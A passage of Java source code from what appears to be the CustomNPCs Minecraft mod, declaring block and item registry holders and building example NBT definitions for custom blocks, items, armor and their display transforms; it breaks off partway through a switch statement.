package noppes.npcs;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.*;
import java.util.Map.Entry;

import com.google.common.collect.BiMap;
import com.google.common.collect.Lists;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;

import net.minecraft.block.Block;
import net.minecraft.block.BlockBanner;
import net.minecraft.block.BlockDispenser;
import net.minecraft.block.BlockDoor;
import net.minecraft.block.properties.IProperty;
import net.minecraft.client.renderer.block.model.ModelResourceLocation;
import net.minecraft.client.renderer.block.statemap.StateMap;
import net.minecraft.dispenser.BehaviorDefaultDispenseItem;
import net.minecraft.dispenser.IBlockSource;
import net.minecraft.entity.Entity;
import net.minecraft.entity.ai.attributes.IAttribute;
import net.minecraft.entity.ai.attributes.RangedAttribute;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.inventory.EntityEquipmentSlot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemArmor.ArmorMaterial;
import net.minecraft.item.ItemLingeringPotion;
import net.minecraft.item.ItemPotion;
import net.minecraft.item.ItemSplashPotion;
import net.minecraft.item.ItemStack;
import net.minecraft.item.ItemTippedArrow;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagFloat;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.potion.Potion;
import net.minecraft.potion.PotionEffect;
import net.minecraft.potion.PotionType;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumParticleTypes;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.registry.RegistryNamespaced;
import net.minecraftforge.client.ForgeHooksClient;
import net.minecraftforge.client.event.ModelRegistryEvent;
import net.minecraftforge.client.model.ModelLoader;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.common.util.EnumHelper;
import net.minecraftforge.event.RegistryEvent;
import net.minecraftforge.fluids.Fluid;
import net.minecraftforge.fluids.FluidRegistry;
import net.minecraftforge.fluids.UniversalBucket;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraftforge.fml.common.registry.EntityEntry;
import net.minecraftforge.fml.common.registry.EntityEntryBuilder;
import net.minecraftforge.fml.common.registry.GameRegistry;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;
import net.minecraftforge.registries.ForgeRegistry;
import noppes.npcs.api.ICustomElement;
import noppes.npcs.blocks.BlockBorder;
import noppes.npcs.blocks.BlockBuilder;
import noppes.npcs.blocks.BlockCarpentryBench;
import noppes.npcs.blocks.BlockCopy;
import noppes.npcs.blocks.BlockCustomBanner;
import noppes.npcs.blocks.BlockMailbox;
import noppes.npcs.blocks.BlockNpcRedstone;
import noppes.npcs.blocks.BlockScripted;
import noppes.npcs.blocks.BlockScriptedDoor;
import noppes.npcs.blocks.BlockWaypoint;
import noppes.npcs.blocks.CustomBlock;
import noppes.npcs.blocks.CustomBlockPortal;
import noppes.npcs.blocks.CustomBlockSlab.CustomBlockSlabDouble;
import noppes.npcs.blocks.CustomBlockSlab.CustomBlockSlabSingle;
import noppes.npcs.blocks.CustomBlockStairs;
import noppes.npcs.blocks.CustomChest;
import noppes.npcs.blocks.CustomDoor;
import noppes.npcs.blocks.CustomLiquid;
import noppes.npcs.blocks.tiles.CustomTileEntityChest;
import noppes.npcs.blocks.tiles.CustomTileEntityPortal;
import noppes.npcs.blocks.tiles.TileBlockAnvil;
import noppes.npcs.blocks.tiles.TileBorder;
import noppes.npcs.blocks.tiles.TileBuilder;
import noppes.npcs.blocks.tiles.TileCopy;
import noppes.npcs.blocks.tiles.TileDoor;
import noppes.npcs.blocks.tiles.TileEntityCustomBanner;
import noppes.npcs.blocks.tiles.TileMailbox;
import noppes.npcs.blocks.tiles.TileMailbox2;
import noppes.npcs.blocks.tiles.TileMailbox3;
import noppes.npcs.blocks.tiles.TileRedstoneBlock;
import noppes.npcs.blocks.tiles.TileScripted;
import noppes.npcs.blocks.tiles.TileScriptedDoor;
import noppes.npcs.blocks.tiles.TileWaypoint;
import noppes.npcs.client.renderer.blocks.BlockCarpentryBenchRenderer;
import noppes.npcs.client.renderer.blocks.BlockChestRenderer;
import noppes.npcs.client.renderer.blocks.BlockCopyRenderer;
import noppes.npcs.client.renderer.blocks.BlockDoorRenderer;
import noppes.npcs.client.renderer.blocks.BlockMailboxRenderer;
import noppes.npcs.client.renderer.blocks.BlockPortalRenderer;
import noppes.npcs.client.renderer.blocks.BlockScriptedRenderer;
import noppes.npcs.constants.EnumParts;
import noppes.npcs.entity.EntityChairMount;
import noppes.npcs.entity.EntityCustomNpc;
import noppes.npcs.entity.EntityNPC64x32;
import noppes.npcs.entity.EntityNPCGolem;
import noppes.npcs.entity.EntityNpcAlex;
import noppes.npcs.entity.EntityNpcClassicPlayer;
import noppes.npcs.entity.EntityNpcCrystal;
import noppes.npcs.entity.EntityNpcDragon;
import noppes.npcs.entity.EntityNpcPony;
import noppes.npcs.entity.EntityNpcSlime;
import noppes.npcs.entity.EntityProjectile;
import noppes.npcs.entity.old.EntityNPCDwarfFemale;
import noppes.npcs.entity.old.EntityNPCDwarfMale;
import noppes.npcs.entity.old.EntityNPCElfFemale;
import noppes.npcs.entity.old.EntityNPCElfMale;
import noppes.npcs.entity.old.EntityNPCEnderman;
import noppes.npcs.entity.old.EntityNPCFurryFemale;
import noppes.npcs.entity.old.EntityNPCFurryMale;
import noppes.npcs.entity.old.EntityNPCHumanFemale;
import noppes.npcs.entity.old.EntityNPCHumanMale;
import noppes.npcs.entity.old.EntityNPCOrcFemale;
import noppes.npcs.entity.old.EntityNPCOrcMale;
import noppes.npcs.entity.old.EntityNPCVillager;
import noppes.npcs.entity.old.EntityNpcEnderchibi;
import noppes.npcs.entity.old.EntityNpcMonsterFemale;
import noppes.npcs.entity.old.EntityNpcMonsterMale;
import noppes.npcs.entity.old.EntityNpcNagaFemale;
import noppes.npcs.entity.old.EntityNpcNagaMale;
import noppes.npcs.entity.old.EntityNpcSkeleton;
import noppes.npcs.fluids.CustomFluid;
import noppes.npcs.items.CustomArmor;
import noppes.npcs.items.CustomBow;
import noppes.npcs.items.CustomFishingRod;
import noppes.npcs.items.CustomFood;
import noppes.npcs.items.CustomItem;
import noppes.npcs.items.CustomItemLingeringPotion;
import noppes.npcs.items.CustomItemPotion;
import noppes.npcs.items.CustomItemSplashPotion;
import noppes.npcs.items.CustomItemTippedArrow;
import noppes.npcs.items.CustomShield;
import noppes.npcs.items.CustomTool;
import noppes.npcs.items.CustomWeapon;
import noppes.npcs.items.ItemBoundary;
import noppes.npcs.items.ItemBuilder;
import noppes.npcs.items.ItemMounter;
import noppes.npcs.items.ItemNbtBook;
import noppes.npcs.items.ItemNpcBlock;
import noppes.npcs.items.ItemNpcBlockDoor;
import noppes.npcs.items.ItemNpcCloner;
import noppes.npcs.items.ItemNpcMovingPath;
import noppes.npcs.items.ItemNpcScripter;
import noppes.npcs.items.ItemNpcWand;
import noppes.npcs.items.ItemPlacer;
import noppes.npcs.items.ItemRemover;
import noppes.npcs.items.ItemReplacer;
import noppes.npcs.items.ItemSaver;
import noppes.npcs.items.ItemScripted;
import noppes.npcs.items.ItemScriptedDoor;
import noppes.npcs.items.ItemSoulstoneEmpty;
import noppes.npcs.items.ItemSoulstoneFilled;
import noppes.npcs.items.ItemTeleporter;
import noppes.npcs.particles.CustomParticleSettings;
import noppes.npcs.potions.CustomPotion;
import noppes.npcs.potions.PotionData;
import noppes.npcs.util.NBTJsonUtil;
import noppes.npcs.util.NBTJsonUtil.JsonException;
import noppes.npcs.util.ObfuscationHelper;

import javax.annotation.Nonnull;

@GameRegistry.ObjectHolder("customnpcs")
public class CustomRegisters {

	@GameRegistry.ObjectHolder("npcborder")
	public static Block border = null;
	@GameRegistry.ObjectHolder("npcbuilderblock")
	public static Block builder = null;
	@GameRegistry.ObjectHolder("npccarpentybench")
	public static Block carpentyBench = null;
	@GameRegistry.ObjectHolder("npccopyblock")
	public static Block copy = null;
	@GameRegistry.ObjectHolder("npcmailbox")
	public static Block mailbox = null;
	@GameRegistry.ObjectHolder("npcredstoneblock")
	public static Block redstoneBlock = null;
	@GameRegistry.ObjectHolder("npcscripted")
	public static Block scripted = null;
	@GameRegistry.ObjectHolder("npcscripteddoor")
	public static Block scriptedDoor = null;
	@GameRegistry.ObjectHolder("npcwaypoint")
	public static Block waypoint = null;

	@GameRegistry.ObjectHolder("npcmobcloner")
	public static Item cloner = null;
	@GameRegistry.ObjectHolder("npcmounter")
	public static Item mount = null;
	@GameRegistry.ObjectHolder("npcmovingpath")
	public static Item moving = null;
	@GameRegistry.ObjectHolder("npcscripteddoortool")
	public static Item scriptedDoorTool = null;
	@GameRegistry.ObjectHolder("npcscripter")
	public static Item scripter = null;
	@GameRegistry.ObjectHolder("npcsoulstoneempty")
	public static Item soulstoneEmpty = null;
	@GameRegistry.ObjectHolder("npcsoulstonefilled")
	public static Item soulstoneFull = null;
	@GameRegistry.ObjectHolder("npcteleporter")
	public static Item teleporter = null;
	@GameRegistry.ObjectHolder("npcwand")
	public static Item wand = null;
	@GameRegistry.ObjectHolder("npcboundary") // New
	public static ItemBoundary npcboundary = null;
	@GameRegistry.ObjectHolder("npcbuilder") // New
	public static Item npcbuilder = null;
	@GameRegistry.ObjectHolder("npcremover") // New
	public static Item npcremover = null;
	@GameRegistry.ObjectHolder("npcplacer") // New
	public static Item npcplacer = null;
	@GameRegistry.ObjectHolder("npcreplacer") // New
	public static Item npcreplacer = null;
	@GameRegistry.ObjectHolder("npcsaver") // New
	public static Item npcsaver = null;

	@GameRegistry.ObjectHolder("nbt_book")
	public static ItemNbtBook nbt_book = null;
	@GameRegistry.ObjectHolder("scripted_item")
	public static ItemScripted scripted_item = null;

	public static CreativeTabNpcs tab = new CreativeTabNpcs("cnpcs");
	public static CreativeTabNpcs tabBlocks = new CreativeTabNpcs("blocks");
	public static CreativeTabNpcs tabItems = new CreativeTabNpcs("items");
	public static Map<Block, Item> customblocks = Maps.newHashMap();
	public static List<Item> customitems = Lists.newArrayList();
	public static List<Potion> custompotions = Lists.newArrayList();
	public static Map<PotionType, PotionData> custompotiontypes = Maps.newHashMap();
	public static Map<Integer, CustomParticleSettings> customparticles = Maps.newTreeMap();
	private static int newEntityStartId = 0;

	/*
	 * 0 - Block 1 - Item 2 - DataSerializerEntry 3 - Enchantment 4 - EntityEntry 5
	 * - Potion 6 - PotionType 7 - SoundEvent 8 - VillagerRegistry 9 - IRecipe
	 */

	private static NBTTagCompound getExampleBlocks() {
		NBTTagCompound nbtBlocks = new NBTTagCompound();
		NBTTagList listBlocks = new NBTTagList();

		NBTTagCompound exampleBlock = new NBTTagCompound();
		exampleBlock.setString("RegistryName", "blockexample");
		exampleBlock.setByte("BlockType", (byte) 0);
		exampleBlock.setFloat("Hardness", 5.0f);
		exampleBlock.setFloat("Resistance", 10.0f);
		exampleBlock.setFloat("LightLevel", 0.0f);
		exampleBlock.setString("SoundType", "GROUND");
		exampleBlock.setString("Material", "STONE");
		NBTTagList aabb = new NBTTagList();
		aabb.appendTag(new NBTTagDouble(0.0625d));
		aabb.appendTag(new NBTTagDouble(0.0625d));
		aabb.appendTag(new NBTTagDouble(0.0625d));
		aabb.appendTag(new NBTTagDouble(0.9375d));
		aabb.appendTag(new NBTTagDouble(0.9375d));
		aabb.appendTag(new NBTTagDouble(0.9375d));
		exampleBlock.setTag("AABB", aabb);
		exampleBlock.setString("BlockRenderType", "MODEL");
		exampleBlock.setBoolean("IsLadder", false);
		exampleBlock.setBoolean("IsPassable", false);
		exampleBlock.setBoolean("IsOpaqueCube", false);
		exampleBlock.setBoolean("IsFullCube", false);
		exampleBlock.setBoolean("CreateAllFiles", true);
		listBlocks.appendTag(exampleBlock);

		NBTTagCompound exampleFacingBlock = new NBTTagCompound();
		exampleFacingBlock.setString("RegistryName", "facingblockexample");
		exampleFacingBlock.setByte("BlockType", (byte) 0);
		exampleFacingBlock.setString("BlockRenderType", "MODEL");
		NBTTagCompound nbtProperty = new NBTTagCompound();
		nbtProperty.setByte("Type", (byte) 4);
		nbtProperty.setString("Name", "facing");
		exampleFacingBlock.setTag("Property", nbtProperty);
		exampleFacingBlock.setBoolean("CreateAllFiles", true);
		listBlocks.appendTag(exampleFacingBlock);

		NBTTagCompound examplelLiquid = new NBTTagCompound();
		examplelLiquid.setString("RegistryName", "liquidexample");
		examplelLiquid.setByte("BlockType", (byte) 1);
		examplelLiquid.setFloat("Resistance", 2.0f);
		examplelLiquid.setInteger("Density", 1100);
		examplelLiquid.setBoolean("IsGaseous", false);
		examplelLiquid.setInteger("Luminosity", 5);
		examplelLiquid.setInteger("Viscosity", 900);
		examplelLiquid.setInteger("Temperature", 300);
		examplelLiquid.setInteger("Color", 0xFFFFFFFF);
		examplelLiquid.setBoolean("CreateAllFiles", true);
		examplelLiquid.setString("Material", "WATER");
		listBlocks.appendTag(examplelLiquid);

		NBTTagCompound exampleChest = new NBTTagCompound();
		exampleChest.setString("RegistryName", "chestexample");
		exampleChest.setByte("BlockType", (byte) 2);
		exampleBlock.setString("Material", "WOOD");
		exampleChest.setBoolean("CreateAllFiles", true);
		exampleChest.setBoolean("IsChest", true);
		exampleChest.setInteger("Size", 14);
		exampleChest.setInteger("GUIColor", 0x46AB86);
		exampleChest.setString("Name", "Custom Chest");
		listBlocks.appendTag(exampleChest);

		NBTTagCompound exampleContainer = new NBTTagCompound();
		exampleContainer.setString("RegistryName", "containerexample");
		exampleContainer.setByte("BlockType", (byte) 2);
		exampleContainer.setString("Material", "STONE");
		exampleContainer.setBoolean("CreateAllFiles", true);
		exampleContainer.setInteger("Size", 96);
		exampleContainer.setIntArray("GUIColor", new int[] { 0x00DC8C, 0xDC8000 });
		exampleContainer.setString("Name", "Custom Container");
		aabb = new NBTTagList();
		aabb.appendTag(new NBTTagDouble(0.0625d));
		aabb.appendTag(new NBTTagDouble(0.0d));
		aabb.appendTag(new NBTTagDouble(0.0625d));
		aabb.appendTag(new NBTTagDouble(0.9375d));
		aabb.appendTag(new NBTTagDouble(1.0d));
		aabb.appendTag(new NBTTagDouble(0.9375d));
		exampleContainer.setTag("AABB", aabb);
		listBlocks.appendTag(exampleContainer);

		NBTTagCompound exampleStairs = new NBTTagCompound();
		exampleStairs.setString("RegistryName", "stairsexample");
		exampleStairs.setByte("BlockType", (byte) 3);
		exampleStairs.setString("Material", "STONE");
		exampleStairs.setBoolean("CreateAllFiles", true);
		exampleStairs.setBoolean("IsFullCube", false);
		exampleStairs.setBoolean("IsOpaqueCube", false);
		listBlocks.appendTag(exampleStairs);

		NBTTagCompound exampleSlab = new NBTTagCompound();
		exampleSlab.setString("RegistryName", "slabexample");
		exampleSlab.setByte("BlockType", (byte) 4);
		exampleSlab.setString("Material", "STONE");
		exampleSlab.setBoolean("CreateAllFiles", true);
		exampleSlab.setBoolean("IsFullCube", false);
		exampleSlab.setBoolean("IsOpaqueCube", false);
		listBlocks.appendTag(exampleSlab);

		NBTTagCompound examplePortal = new NBTTagCompound();
		examplePortal.setString("RegistryName", "portalexample");
		examplePortal.setByte("BlockType", (byte) 5);
		examplePortal.setString("Material", "PORTAL");
		NBTTagCompound nbtRender = new NBTTagCompound();
		nbtRender.setFloat("SecondSpeed", 800.0f);
		nbtRender.setString("SpawnParticle", "CRIT");
		nbtRender.setFloat("Transparency", 0.5f);
		examplePortal.setTag("RenderData", nbtRender);
		examplePortal.setInteger("DimensionID", 100);
		examplePortal.setInteger("HomeDimensionID", 0);
		examplePortal.setBoolean("CreateAllFiles", true);
		listBlocks.appendTag(examplePortal);

		NBTTagCompound exampleDoor = new NBTTagCompound();
		exampleDoor.setString("RegistryName", "doorexample");
		exampleDoor.setByte("BlockType", (byte) 6);
		exampleDoor.setString("Material", "IRON");
		exampleDoor.setFloat("Hardness", 1.0f);
		exampleDoor.setFloat("Resistance", 25.0f);
		exampleDoor.setBoolean("CreateAllFiles", true);
		exampleDoor.setBoolean("InteractOpen", true);
		exampleDoor.setFloat("LightLevel", 2.0f);
		listBlocks.appendTag(exampleDoor);

		nbtBlocks.setTag("Blocks", listBlocks);
		return nbtBlocks;
	}

	private static NBTTagCompound getExampleItems() {
		NBTTagCompound nbtItems = new NBTTagCompound();
		NBTTagList listItems = new NBTTagList();

		NBTTagCompound exampleItem = new NBTTagCompound();
		exampleItem.setString("RegistryName", "itemexample");
		exampleItem.setByte("ItemType", (byte) 0);
		exampleItem.setInteger("MaxStackSize", 64);
		exampleItem.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleItem);

		NBTTagCompound exampleWeapon = new NBTTagCompound();
		exampleWeapon.setString("RegistryName", "weaponexample");
		exampleWeapon.setByte("ItemType", (byte) 1);
		exampleWeapon.setInteger("MaxStackDamage", 2500);
		exampleWeapon.setDouble("EntityDamage", 2.5d);
		exampleWeapon.setDouble("SpeedAttack", -2.4d);
		exampleWeapon.setBoolean("IsFull3D", true);
		exampleWeapon.setString("Material", "GOLD");
		exampleWeapon.setTag("RepairItem", (new ItemStack(Items.GOLD_NUGGET)).writeToNBT(new NBTTagCompound()));
		NBTTagCompound collectionMaterial = new NBTTagCompound();
		collectionMaterial.setString("Material", "WEB");
		collectionMaterial.setFloat("Speed", 15.0f);
		exampleWeapon.setTag("CollectionMaterial", collectionMaterial);
		exampleWeapon.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleWeapon);

		NBTTagCompound exampleTool = new NBTTagCompound();
		exampleTool.setString("RegistryName", "toolexample");
		exampleTool.setByte("ItemType", (byte) 2);
		exampleTool.setInteger("MaxStackDamage", 2000);
		exampleTool.setBoolean("IsFull3D", true);
		exampleTool.setFloat("Efficiency", 4.0f);
		exampleTool.setDouble("EntityDamage", 0.0d);
		exampleTool.setString("ToolClass", "pickaxe");
		exampleTool.setString("Material", "GOLD");
		exampleTool.setTag("RepairItem", (new ItemStack(Items.GOLD_NUGGET)).writeToNBT(new NBTTagCompound()));
		exampleTool.setInteger("HarvestLevel", 2);
		exampleTool.setInteger("Enchantability", 25);
		NBTTagList collectionBlocks = new NBTTagList();
		collectionBlocks.appendTag(new NBTTagString(Objects.requireNonNull(Blocks.STONE.getRegistryName()).toString()));
		collectionBlocks.appendTag(new NBTTagString(Objects.requireNonNull(Blocks.OBSIDIAN.getRegistryName()).toString()));
		exampleTool.setTag("CollectionBlocks", collectionBlocks);
		exampleTool.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleTool);
		
		NBTTagCompound exampleAxe = new NBTTagCompound();
		exampleAxe.setString("RegistryName", "axeexample");
		exampleAxe.setByte("ItemType", (byte) 2);
		exampleAxe.setInteger("MaxStackDamage", 2200);
		exampleAxe.setBoolean("IsFull3D", true);
		exampleAxe.setFloat("Efficiency", 4.25f);
		exampleAxe.setDouble("EntityDamage", 5.0d);
		exampleAxe.setString("ToolClass", "axe");
		exampleAxe.setString("Material", "GOLD");
		exampleAxe.setTag("RepairItem", (new ItemStack(Items.GOLD_INGOT)).writeToNBT(new NBTTagCompound()));
		exampleAxe.setInteger("HarvestLevel", 2);
		exampleAxe.setInteger("Enchantability", 28);
		exampleAxe.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleAxe);

		NBTTagCompound exampleArmor = new NBTTagCompound();
		exampleArmor.setString("RegistryName", "armorexample");
		exampleArmor.setByte("ItemType", (byte) 3);
		exampleArmor.setDouble("EntityDamage", 0.0d);
		exampleArmor.setInteger("RenderIndex", 4);
		exampleArmor.setString("Material", "GOLD");
		exampleArmor.setTag("RepairItem", (new ItemStack(Items.GOLD_NUGGET)).writeToNBT(new NBTTagCompound()));
		exampleArmor.setBoolean("CreateAllFiles", true);
		exampleArmor.setIntArray("MaxStackDamage", new int[] { 2250, 3100, 1800 });
		NBTTagList slots = new NBTTagList();
		slots.appendTag(new NBTTagString("HEAD"));
		slots.appendTag(new NBTTagString("Chest"));
		slots.appendTag(new NBTTagString("feet"));
		exampleArmor.setTag("EquipmentSlots", slots);
		exampleArmor.setIntArray("DamageReduceAmount", new int[] { 5, 7, 4 });
		NBTTagList toughness = new NBTTagList();
		toughness.appendTag(new NBTTagFloat(2.2f));
		toughness.appendTag(new NBTTagFloat(3.5f));
		toughness.appendTag(new NBTTagFloat(1.8f));
		exampleArmor.setTag("Toughness", toughness);
		listItems.appendTag(exampleArmor);
		
		NBTTagCompound exampleOBJArmor = new NBTTagCompound();
		exampleOBJArmor.setString("RegistryName", "armorobjexample");
		exampleOBJArmor.setByte("ItemType", (byte) 3);
		toughness = new NBTTagList();
		toughness.appendTag(new NBTTagFloat(2.2f));
		toughness.appendTag(new NBTTagFloat(3.5f));
		toughness.appendTag(new NBTTagFloat(2.6f));
		toughness.appendTag(new NBTTagFloat(1.8f));
		exampleOBJArmor.setTag("Toughness", toughness);
		exampleOBJArmor.setIntArray("DamageReduceAmount", new int[] { 5, 7, 6, 4 });
		exampleOBJArmor.setString("Material", "IRON");
		exampleOBJArmor.setTag("RepairItem", (new ItemStack(Items.IRON_INGOT)).writeToNBT(new NBTTagCompound()));
		exampleOBJArmor.setIntArray("MaxStackDamage", new int[] { 2250, 3100, 2700, 1800 });
		slots = new NBTTagList();
		slots.appendTag(new NBTTagString("HEAD"));
		slots.appendTag(new NBTTagString("Chest"));
		slots.appendTag(new NBTTagString("LeGs"));
		slots.appendTag(new NBTTagString("feet"));
		exampleOBJArmor.setTag("EquipmentSlots", slots);
		exampleOBJArmor.setDouble("EntityDamage", 0.0d);
		NBTTagCompound objData = new NBTTagCompound();
			NBTTagList meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.HEAD.name));
			objData.setTag("Head Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.BODY.name));
			objData.setTag("Body Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.ARM_RIGHT.name));
			objData.setTag("Arm Right Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.WRIST_RIGHT.name));
			objData.setTag("Wrist Right Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.ARM_LEFT.name));
			objData.setTag("Arm Left Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.WRIST_LEFT.name));
			objData.setTag("Wrist Left Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.BELT.name));
			objData.setTag("Belt Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.LEG_RIGHT.name));
			objData.setTag("Leg Right Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.FOOT_RIGHT.name));
			objData.setTag("Foot Right Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.LEG_LEFT.name));
			objData.setTag("Leg Left Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.FOOT_LEFT.name));
			objData.setTag("Foot Left Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.FEET_LEFT.name));
			objData.setTag("Boot Left Mesh Names", meshes);
			meshes = new NBTTagList();
			meshes.appendTag(new NBTTagString(EnumParts.FEET_RIGHT.name));
			objData.setTag("Boot Right Mesh Names", meshes);
		exampleOBJArmor.setTag("OBJData", objData);
		
		NBTTagCompound display = new NBTTagCompound();
		for (int s = 0; s < 4; s++) {
			String slot = s == 0 ? "CHEST" : s == 1 ? "LEGS" : s == 2 ? "FEET" : "HEAD";
			NBTTagCompound cameraData = new NBTTagCompound();
			for (int i = 0; i < 8; i++) {
				String part;
				NBTTagList rotation = new NBTTagList();
				NBTTagList translation = new NBTTagList();
				NBTTagList scale = new NBTTagList();
				switch(i) {
					case 0: { // THIRD_PERSON_LEFT_HAND
						part = "thirdperson_lefthand";
						switch(slot) {
							case "CHEST": {
								translation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
							case "LEGS": {
								translation.appendTag(new NBTTagFloat(-0.15f));
								translation.appendTag(new NBTTagFloat(0.35f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.65f)); }
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(90.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(1.15f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.65f)); }
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(1.0f));
								translation.appendTag(new NBTTagFloat(-0.375f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
						}
						break;
					}
					case 1: { // THIRD_PERSON_RIGHT_HAND
						part = "thirdperson_righthand";
						switch(slot) {
							case "CHEST": {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
							case "LEGS": {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.35f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.65f)); }
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(90.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.65f)); }
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(-0.375f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
						}
						break;
					}
					case 2: { // FIRST_PERSON_LEFT_HAND
						part = "firstperson_lefthand";
						switch(slot) {
							case "CHEST": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.57f));
								translation.appendTag(new NBTTagFloat(0.1f));
								translation.appendTag(new NBTTagFloat(-0.085f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
							case "LEGS": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.65f));
								translation.appendTag(new NBTTagFloat(0.4f));
								translation.appendTag(new NBTTagFloat(-0.085f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.72f));
								translation.appendTag(new NBTTagFloat(0.435f));
								translation.appendTag(new NBTTagFloat(-0.585f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.85f)); }
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.57f));
								translation.appendTag(new NBTTagFloat(-0.225f));
								translation.appendTag(new NBTTagFloat(-0.085f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
						}
						break;
					}
					case 3: { // FIRST_PERSON_RIGHT_HAND
						part = "firstperson_righthand";
						switch(slot) {
							case "CHEST": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.85f));
								translation.appendTag(new NBTTagFloat(-0.1f));
								translation.appendTag(new NBTTagFloat(0.2f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.6f)); }
								break;
							}
							case "LEGS": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.95f));
								translation.appendTag(new NBTTagFloat(0.25f));
